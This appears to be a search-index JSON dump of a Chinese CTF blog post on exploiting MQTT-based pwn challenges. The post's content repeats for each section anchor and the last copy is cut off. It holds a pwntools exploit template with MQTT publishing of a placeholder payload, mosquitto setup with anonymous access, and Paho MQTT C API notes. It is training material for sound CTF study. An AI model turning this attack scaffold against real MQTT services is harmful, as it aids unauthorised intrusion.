[{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#模板"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#基础知识"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#配置环境"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#paho-mqtt-c"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#paho-mqtt-python"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda 